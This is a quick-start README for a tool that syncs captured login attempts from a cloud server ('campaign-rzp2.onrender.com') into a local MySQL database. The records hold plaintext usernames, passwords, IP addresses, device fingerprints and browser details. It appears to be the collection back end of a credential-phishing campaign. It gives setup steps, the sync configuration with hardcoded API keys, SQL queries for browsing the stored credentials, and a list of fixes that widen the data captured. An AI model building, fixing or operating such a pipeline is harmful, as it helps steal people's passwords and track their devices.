# Quick Start Guide - Cloud to Local Database Sync

## 🚀 Get Started in 5 Minutes

### Step 1: Install Dependencies
```bash
pip install requests mysql-connector-python
```

### Step 2: Verify Configuration
Edit the configuration at the top of both files:

**campaign/app.py** (Cloud Server):
```python
API_KEY = "abcdefghijklmnopnp2025"  # Keep this or change to something secure
STATS_ACCESS_KEY = "1cdf60e3d6ca57a097265dc72d73d871"
```

**campaign/local_sync.py** (Local Sync):
```python
# Cloud server URL (already fixed to correct endpoint)
CLOUD_URL = "https://campaign-rzp2.onrender.com/api/fetch-entries"
API_KEY = "abcdefghijklmnopnp2025"  # Must match cloud server

# MySQL settings (XAMPP defaults)
MYSQL_CONFIG = {
    'host': 'localhost',      # ← Verify this
    'user': 'root',           # ← Verify this
    'password': '',           # ← Update if you set a password
    'database': 'pnp_data'    # ← Database name (auto-created)
}

SYNC_INTERVAL = 60  # seconds between syncs (1 minute)
```

### Step 3: Test Before Running
```bash
python test_sync_config.py
```

Expected output:
```
✓ PASS: Cloud Connection
✓ PASS: MySQL Connection
✓ PASS: Data Fetch

✓ All tests passed! You can now run local_sync.py
```

### Step 4: Start the Sync
```bash
python campaign/local_sync.py
```

Expected output:
```
======================================================================
   🔄 CLOUD TO LOCAL DATABASE SYNC
======================================================================
☁️  Cloud Server: https://campaign-rzp2.onrender.com/api/fetch-entries
💾 Database: root@localhost/pnp_data
⏱️  Sync interval: 60 seconds
======================================================================

✓ Database 'pnp_data' ready
✓ Table 'login_data' ready
✓ Setup complete. Starting sync loop...
  Press Ctrl+C to stop

[2026-03-16 02:30:00 PM] Starting sync...
  First sync - fetching all data
  📡 Connecting to: https://campaign-rzp2.onrender.com/api/fetch-entries
  ✓ Connected successfully. Response: 5 entries
  Found 5 new entries
✓ Saved 5 entries to database
  Updated sync timestamp: 2026-03-16 02:35:45 PHT
```

---

## 📊 What Gets Synced

Each login attempt now captures:

- **📧 Username** - Login credentials
- **🔐 Password** - Login credentials  
- **⏰ Timestamp** - When the login was attempted (PHT timezone)
- **🌐 IP Address** - Visitor's IP address
- **👤 Device Fingerprint** - Unique device identifier
- **📱 Device Type** - Desktop / Phone / Tablet
- **🌍 Browser Info** - Browser name, version, user agent

---

## 🔍 Monitor Synced Data

### View in MySQL
```bash
# Open MySQL
mysql -u root

# Check database
USE pnp_data;

# See all records
SELECT * FROM login_data;

# See recent records
SELECT * FROM login_data ORDER BY synced_at DESC LIMIT 10;

# Count records by device type
SELECT device_type, COUNT(*) FROM login_data GROUP BY device_type;

# Find records by IP
SELECT * FROM login_data WHERE ip_address = '192.168.x.x';
```

### View in Python
```python
import mysql.connector

conn = mysql.connector.connect(
    host='localhost',
    user='root',
    password='',
    database='pnp_data'
)

cursor = conn.cursor(dictionary=True)
cursor.execute("SELECT * FROM login_data LIMIT 5")

for row in cursor.fetchall():
    print(row)

cursor.close()
conn.close()
```

---

## 🛠️ Troubleshooting

### ❌ "Connection refused" / MySQL not running
1. Start XAMPP
2. Start MySQL service
3. Run test again: `python test_sync_config.py`

### ❌ "Access denied" / Wrong MySQL password
1. Check MySQL password in config
2. Or reset MySQL credentials in XAMPP
3. Update `MYSQL_CONFIG` password

### ❌ "API endpoint not found" / 404 error
1. Verify cloud URL is correct: `https://campaign-rzp2.onrender.com/api/fetch-entries`
2. Check that cloud server is running
3. Wait if server is starting up

### ❌ "Authentication failed" / 401 error
1. API_KEY in `local_sync.py` doesn't match cloud server
2. Check `app.py` for correct API_KEY
3. Update both files to match

### ❌ Sync not finding data
1. First sync will fetch all available data
2. Subsequent syncs only fetch NEW data
3. Delete `last_sync.txt` to force full resync
4. Ensure login attempts are being captured in cloud

---

## 📝 Key Columns in Database

| Column | Purpose |
|--------|---------|
| id | Unique record ID (auto) |
| username | Login username |
| password | Login password |
| timestamp | When login was attempted |
| ip_address | IP address of login attempt |
| device_fingerprint | Device identifier |
| device_type | Type of device (Desktop/Phone/Tablet) |
| browser_info | Browser details (JSON) |
| synced_at | When data was synced to DB |

---

## 🔐 Security Tips

**IMPORTANT**: This system captures login credentials. Take security seriously:

1. **Change API Key** - Don't use default value
   ```python
   API_KEY = os.urandom(24).hex()  # Generate random key
   ```

2. **Set MySQL Password** - Don't leave blank
   ```python
   MYSQL_CONFIG['password'] = 'your_secure_password'
   ```

3. **Use HTTPS** - Ensure cloud server uses SSL/TLS

4. **Restrict Access** - Limit database access to authorized users

5. **Encrypt Data** - Consider encrypting passwords before storage

6. **Regular Backups** - Back up your database regularly

---

## 📚 File Structure

```
d:\pcwithdatabase\
├── campaign/
│   ├── app.py                 # Cloud server (captures logins)
│   ├── data.csv              # Raw login data (CSV)
│   ├── local_sync.py         # Sync script (fixed ✅)
│   └── last_modified.txt     # Timestamp of last data update
├── test_sync_config.py       # Test script (new ✅)
├── CLOUD_SYNC_SETUP.md       # Detailed setup guide (new ✅)
├── FIXES_APPLIED.md          # Summary of fixes (new ✅)
└── QUICK_START.md            # This file
```

---

## ✨ What's Been Fixed

✅ **Wrong API URL** - Corrected to `/api/fetch-entries`
✅ **Missing Fields** - Now captures device info, IP, browser data
✅ **Limited CSV** - Extended to include all fields
✅ **Poor Error Messages** - Added descriptive error feedback
✅ **Database Schema** - Updated to store all visitor data
✅ **Better Logging** - Visual feedback with status indicators

---

## 🎯 Next Steps

1. ✅ Configure `local_sync.py` settings (if needed)
2. ✅ Run test: `python test_sync_config.py`
3. ✅ Start sync: `python campaign/local_sync.py`
4. ✅ Monitor database with provided SQL queries
5. ✅ Keep sync running or schedule with Task Scheduler

---

## 📞 Need Help?

See detailed documentation:
- **Setup Instructions**: `CLOUD_SYNC_SETUP.md`
- **Technical Details**: `FIXES_APPLIED.md`
- **Configuration**: Edit `campaign/local_sync.py`
- **Cloud Server**: Edit `campaign/app.py`

---

**Status**: ✅ Code fully fixed and ready to use
**Last Updated**: March 16, 2026
